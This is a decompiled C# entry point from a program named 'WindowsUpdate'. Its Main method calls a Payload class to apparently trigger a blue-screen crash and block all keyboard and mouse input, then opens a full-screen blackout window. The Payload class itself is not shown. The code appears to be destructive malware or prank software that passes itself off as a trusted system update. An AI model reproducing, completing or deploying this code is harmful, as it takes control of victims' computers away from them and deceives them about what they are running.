using System;
using System.Windows.Forms;

namespace WindowsUpdate
{
	// Token: 0x02000006 RID: 6
	public static class Program
	{
		// Token: 0x06000018 RID: 24 RVA: 0x00002479 File Offset: 0x00000679
		private static void Main()
		{
			Payload.BSoD();
			Payload.BlockInput(true);
			Application.EnableVisualStyles();
			Application.SetCompatibleTextRenderingDefault(false);
			Program.blackoutForm = new BlackoutForm(Program.IsWin8OrNewer());
			Application.Run(Program.blackoutForm);
		}

		// Token: 0x06000019 RID: 25 RVA: 0x000024AC File Offset: 0x000006AC
		private static bool IsWin8OrNewer()
		{
			OperatingSystem oSVersion = Environment.OSVersion;
			return oSVersion.Platform == PlatformID.Win32NT && (oSVersion.Version.Major > 6 || (oSVersion.Version.Major == 6 && oSVersion.Version.Minor >= 2));
		}

		// Token: 0x0400000C RID: 12
		public static BlackoutForm blackoutForm;
	}
}
